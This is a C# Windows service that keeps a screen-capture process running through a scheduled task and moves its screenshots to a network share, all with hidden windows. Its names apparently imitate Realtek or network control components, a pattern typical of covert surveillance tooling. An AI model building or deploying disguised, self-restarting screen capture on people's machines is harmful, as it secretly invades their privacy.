using ScreenShotLogic;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Linq;
using System.ServiceProcess;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace NetCTLService
{
    public partial class NetCTLService : ServiceBase
    {
        private Timer verifyProcessTimer;

        private Timer robocopyScreenShotsTimer;

        private Variables variables;

        public NetCTLService()
        {
            InitializeComponent();
            variables = new Variables();
        }

        protected override void OnStart(string[] args)
        {
            verifyProcessTimer = new System.Threading.Timer(new TimerCallback(VerifyProcessTimer_Tick), null, 0, variables.verifyProcessAccessableInMillisec);

            robocopyScreenShotsTimer = new System.Threading.Timer(new TimerCallback(RobocopyScreenShots_Tick), null, 0, variables.robocopyTimerInMillisec);
        }

        private void RobocopyScreenShots_Tick(object state)
        {
            Process killProc;
            using (killProc = new Process())
            {
                ProcessStartInfo psi = new ProcessStartInfo("cmd.exe");
                psi.Arguments = "/c taskkill /im robocopy* /f";
                psi.WindowStyle = ProcessWindowStyle.Hidden;
                killProc.StartInfo = psi;
                killProc.Start();
                killProc.WaitForExit(10000);

            }
            Process process;

            using (process = new Process())
            {
                string curData = DateTime.Now.ToShortDateString();
                ProcessStartInfo psi = new ProcessStartInfo("cmd.exe");
                string fullPath = System.IO.Path.Combine(variables.pathToNasFolder, curData);
                psi.Arguments = $"/c robocopy {System.IO.Path.GetDirectoryName(variables.pathScreenShots)} {fullPath} /move";
                psi.WindowStyle = ProcessWindowStyle.Hidden;
                process.StartInfo = psi;
                process.Start();
            }
        }

        protected override void OnStop()
        {
            try
            {
                Process killProc;
                using (killProc = new Process())
                {
                    ProcessStartInfo psi = new ProcessStartInfo("cmd.exe");
                    psi.Arguments = "/c taskkill /im realtekctl* /f";
                    psi.WindowStyle = ProcessWindowStyle.Hidden;
                    killProc.StartInfo = psi;
                    killProc.Start();

                }

                Process killProcR;
                using (killProcR = new Process())
                {
                    ProcessStartInfo psi = new ProcessStartInfo("cmd.exe");
                    psi.Arguments = "/c taskkill /im robocopy* /f";
                    psi.WindowStyle = ProcessWindowStyle.Hidden;
                    killProcR.StartInfo = psi;
                    killProcR.Start();

                }

                verifyProcessTimer.Dispose();
            }
            catch (Exception)
            {
            }

        }

        private void VerifyProcessTimer_Tick(object state)
        {
            try
            {
                var runningProcs = from proc in Process.GetProcesses(".") orderby proc.Id select proc;
                if (runningProcs.Count(p => p.ProcessName.Contains(variables.processName)) > 0)
                {
                }
                else
                {
                    Process process;
                    using (process = new Process())
                    {
                        ProcessStartInfo startInfo = new ProcessStartInfo("cmd.exe");
                        startInfo.Arguments = $"/c schtasks /Run /TN {variables.schtasksTaskName}";
                        startInfo.UseShellExecute = true;
                        process.StartInfo = startInfo;
                        process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
                        process.Start();
                    }
                }
            }
            catch (Exception)
            {
            }

        }
    }
}
